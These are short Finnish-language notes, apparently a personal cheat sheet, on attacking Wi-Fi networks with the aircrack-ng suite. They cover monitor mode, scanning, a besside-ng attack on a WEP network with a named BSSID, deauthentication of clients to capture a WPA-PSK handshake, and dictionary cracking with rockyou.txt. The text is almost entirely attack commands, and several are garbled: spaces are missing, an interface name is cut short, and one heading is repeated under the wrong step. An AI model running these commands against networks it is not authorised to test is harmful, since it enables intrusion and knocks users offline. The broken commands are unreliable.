Laitetaan WLAN monitorointi päälle

````
sudo airmon-ng start wlan1
````

Kuunnellaan mitä WLAN kanavia löydetään

````
sudo airodump-ng wlan1mon -w scan --manufacturer
````

Valmistaudutaan hyökkäämään WEP alausta vastaan ja generoidaan liikennettä 
hyökkäyksen tueksi

````
sudo airmon-ngstop wlan1mon 
sudo besside-ng -c 6 -b 1C:74:0D:9F:4F:05 wlan1 -v
````

Valmistaudutaan hyökkäämään WEP alausta vastaan ja generoidaan liikennettä 
hyökkäyksen tueksi

````
sudo aircrack-ngwep.cap
````

Laitetaan WLAN monitorointi päälle

````
sudo airmon-ng start wlan1
````

WPA-PSK
Huom! Olisi hyvä, jos verkossa olisi aktiivisia laitteita!

````
sudo airodump-ngwlan1mon -w wpa-psk-c 6 –wps
Samaan aikaan ajetaan myös komento
sudo aireplay-ng-0 10 -a 1C:74:0D:9F:4F:05 wlan1mo
````

Ja lopuksi hyökätään kiinni .cap tai .pcap tiedostoon

````
aircrack-ngwpa-psk-01.cap-wwifi/rockyou.txt
````
